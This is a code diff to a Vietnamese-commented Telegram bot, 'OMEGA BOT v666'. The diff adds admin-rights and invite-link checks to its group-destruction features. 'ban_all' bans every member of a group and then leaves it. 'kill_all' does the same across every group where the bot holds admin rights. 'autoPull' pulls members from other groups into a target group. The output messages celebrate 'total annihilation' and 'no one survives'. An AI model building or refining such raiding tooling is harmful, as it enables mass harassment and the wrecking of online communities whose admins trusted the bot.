@@ -1,5 +1,5 @@
 // ============================================================
-// OMEGA BOT v666 — FIX LỖI EXITED STATUS 1 TRÊN RENDER
+// OMEGA BOT v666 — KIỂM TRA LINK GROUP + QUYỀN ADMIN TRƯỚC KHI BAN/KÉO/GIẾT
 // ============================================================
 
 const express = require('express');
@@ -46,6 +46,27 @@ function getMenu(isAdmin) {
   buttons.push([Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]);
 
   return Markup.inlineKeyboard(buttons);
+}
+
+// ==================== KIỂM TRA BOT CÓ TRONG GROUP KHÔNG ====================
+async function checkBotInGroup(chatId) {
+  try {
+    const chat = await bot.telegram.getChat(chatId);
+    const botMember = await bot.telegram.getChatMember(chatId, (await bot.telegram.getMe()).id);
+    return { inGroup: true, isAdmin: botMember.status === 'administrator' || botMember.status === 'creator', chat: chat };
+  } catch (e) {
+    return { inGroup: false, isAdmin: false, chat: null };
+  }
+}
+
+// ==================== LẤY LINK GROUP ====================
+async function getGroupLink(chatId) {
+  try {
+    const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
+    return inviteLink;
+  } catch (e) {
+    return null;
+  }
 }
 
 // ==================== WELCOME ====================
@@ -99,6 +120,17 @@ async function autoPull() {
       if (!pullActive) break;
       
       try {
+        // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
+        const botCheck = await checkBotInGroup(group.id);
+        if (!botCheck.inGroup) {
+          console.log(`⚠️ Bot không có trong group: ${group.title || group.id}`);
+          continue;
+        }
+        if (!botCheck.isAdmin) {
+          console.log(`⚠️ Bot không phải admin trong group: ${group.title || group.id}`);
+          continue;
+        }
+
         const membersCount = await bot.telegram.getChatMembersCount(group.id);
         if (membersCount < 30) continue;
 
@@ -138,9 +170,19 @@ async function banAllMembers(chatId, ctx) {
   let total = 0;
 
   try {
-    const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
-    if (!botMember.status.includes('administrator') && botMember.status !== 'creator') {
-      throw new Error('Bot chưa được làm admin trong group này! Thêm bot làm admin rồi thử lại.');
+    // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
+    const botCheck = await checkBotInGroup(chatId);
+    if (!botCheck.inGroup) {
+      throw new Error('❌ Bot chưa được thêm vào group này!');
+    }
+    if (!botCheck.isAdmin) {
+      throw new Error('❌ Bot chưa được làm admin trong group này! Thêm bot làm admin rồi thử lại.');
+    }
+
+    // 🔥 LẤY LINK GROUP
+    const link = await getGroupLink(chatId);
+    if (!link) {
+      throw new Error('❌ Không thể lấy link group! Kiểm tra quyền của bot.');
     }
 
     const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
@@ -174,7 +216,7 @@ async function banAllMembers(chatId, ctx) {
       await ctx.telegram.leaveChat(chatId);
     } catch {}
 
-    return { banned, failed, total };
+    return { banned, failed, total, link };
   } catch (e) {
     throw new Error(e.message);
   }
@@ -184,6 +226,19 @@ async function banAllMembers(chatId, ctx) {
 bot.action('pull_on', async (ctx) => {
   if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
   if (pullActive) return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
+  
+  // 🔥 KIỂM TRA BOT CÓ TRONG GROUP TARGET KHÔNG
+  try {
+    const targetCheck = await checkBotInGroup((await bot.telegram.getChat(TARGET_GROUP_LINK)).id);
+    if (!targetCheck.inGroup) {
+      return ctx.answerCbQuery('❌ Bot chưa được thêm vào group target!');
+    }
+    if (!targetCheck.isAdmin) {
+      return ctx.answerCbQuery('❌ Bot chưa được làm admin trong group target!');
+    }
+  } catch (e) {
+    return ctx.answerCbQuery('❌ Không tìm thấy group target!');
+  }
   
   pullActive = true;
   await ctx.answerCbQuery('🚀 BẮT ĐẦU KÉO MEM!');
@@ -229,11 +284,42 @@ bot.action('ban_all', async (ctx) => {
   if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
   
   isKilling = true;
-  await ctx.answerCbQuery('🔨 ĐANG GIẾT!');
+  await ctx.answerCbQuery('🔨 ĐANG KIỂM TRA...');
+  
+  // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
+  const botCheck = await checkBotInGroup(chat.id);
+  if (!botCheck.inGroup) {
+    await ctx.reply(`❌ Bot chưa được thêm vào group này!\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}`);
+    isKilling = false;
+    return;
+  }
+  if (!botCheck.isAdmin) {
+    await ctx.reply(`❌ Bot chưa được làm admin trong group này!\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}\n🛠️ **Hướng dẫn:** Thêm bot làm admin rồi thử lại.`);
+    isKilling = false;
+    return;
+  }
+  
+  // 🔥 LẤY LINK GROUP
+  const link = await getGroupLink(chat.id);
+  if (!link) {
+    await ctx.reply(`❌ Không thể lấy link group! Kiểm tra quyền của bot.\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}`);
+    isKilling = false;
+    return;
+  }
+  
+  await ctx.reply(`🔥 **BAN ALL - GIẾT GROUP**\n\n📌 **Link group:** ${link}\n👥 **Số thành viên:** ${await ctx.telegram.getChatMembersCount(chat.id)}\n\n☠️ Đang giết tất cả thành viên...`);
   
   try {
     const result = await banAllMembers(chat.id, ctx);
-    await ctx.reply(`✅ Đã giết ${result.banned} người.`);
+    await ctx.reply(
+      `✅ **GIẾT GROUP HOÀN TẤT**\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📌 **Link group:** ${result.link}\n` +
+      `💀 Đã ban: ${result.banned} người\n` +
+      `❌ Lỗi: ${result.failed}\n` +
+      `👥 Tổng: ${result.total}\n\n` +
+      `☠️ Không ai sống sót.`
+    );
   } catch (e) {
     await ctx.reply(`❌ ${e.message}`);
   }
@@ -247,7 +333,7 @@ bot.action('kill_all', async (ctx) => {
   
   isKilling = true;
   await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
-  await ctx.reply('☠️ Đang giết tất cả group...');
+  await ctx.reply('☠️ Đang kiểm tra và giết tất cả group...');
   
   try {
     const dialogs = await ctx.telegram.getChats();
@@ -258,24 +344,52 @@ bot.action('kill_all', async (ctx) => {
     
     let killed = 0;
     let totalBanned = 0;
+    let groupList = [];
     
     for (const group of groups) {
+      // 🔥 KIỂM TRA TỪNG GROUP
+      const botCheck = await checkBotInGroup(group.id);
+      if (!botCheck.inGroup || !botCheck.isAdmin) {
+        console.log(`⚠️ Bỏ qua group ${group.title || group.id}: Bot không có quyền`);
+        continue;
+      }
+      
+      const link = await getGroupLink(group.id);
+      if (!link) {
+        console.log(`⚠️ Bỏ qua group ${group.title || group.id}: Không lấy được link`);
+        continue;
+      }
+      
+      groupList.push({ id: group.id, title: group.title || group.id, link: link });
+    }
+    
+    if (groupList.length === 0) {
+      await ctx.reply('❌ Không tìm thấy group nào bot có đủ quyền để giết!');
+      isKilling = false;
+      return;
+    }
+    
+    await ctx.reply(`☠️ **Tìm thấy ${groupList.length} groups có thể giết**\n\n` + groupList.map(g => `📌 ${g.link}`).join('\n'));
+    
+    for (const group of groupList) {
       try {
         const result = await banAllMembers(group.id, ctx);
         killed++;
         totalBanned += result.banned;
-        await ctx.reply(`✅ Đã giết group ${group.title || group.id} — ${result.banned} người`);
+        await ctx.reply(`✅ Đã giết group ${group.title} — ${result.banned} người\n📌 ${group.link}`);
         await new Promise(r => setTimeout(r, 800));
       } catch (e) {
-        await ctx.reply(`❌ Lỗi group ${group.title || group.id}: ${e.message}`);
+        await ctx.reply(`❌ Lỗi group ${group.title}: ${e.message}`);
       }
     }
 
     await ctx.reply(
       `✅ **TOTAL ANNIHILATION COMPLETE**\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
       `☠️ Đã giết: ${killed} groups\n` +
       `💀 Tổng số người bị ban: ${totalBanned}\n` +
-      `🛡️ Đã bỏ qua: @ongvuaphantich`
+      `🛡️ Đã bỏ qua: @ongvuaphantich\n\n` +
+      `*Không ai sống sót.*`
     );
   } catch (e) {
     await ctx.reply(`❌ Lỗi: ${e.message}`);
@@ -313,7 +427,7 @@ bot.action('status', async (ctx) => {
   }
 });
 
-// ==================== WEB SERVER + KEEP ALIVE ====================
+// ==================== WEB SERVER ====================
 app.use(express.json());
 
 app.get('/', (req, res) => {
@@ -332,14 +446,12 @@ app.get('/', (req, res) => {
 // ==================== LAUNCH ====================
 const PORT = process.env.PORT || 3000;
 
-// 🔥 QUAN TRỌNG: Giữ bot chạy bằng cả web server + polling
 app.listen(PORT, () => {
   console.log(`✅ Web server chạy trên port ${PORT}`);
   console.log(`🐱 OMEGA BOT ONLINE`);
   console.log(`👑 Admin: ${ADMIN_ID}`);
 });
 
-// 🔥 Khởi động bot với cơ chế giữ kết nối
 bot.launch({
   dropPendingUpdates: true
 })
@@ -351,13 +463,10 @@ bot.launch({
   process.exit(1);
 });
 
-// 🔥 GIỮ TIẾN TRÌNH SỐNG - KHÔNG CHO TẮT
 setInterval(() => {
-  // Ping để giữ web server hoạt động
   console.log('💓 OMEGA BOT vẫn đang sống...');
 }, 30000);
 
-// ==================== XỬ LÝ TẮT MÁY ====================
 process.once('SIGINT', () => {
   console.log('🛑 Đang tắt bot...');
   bot.stop('SIGINT');
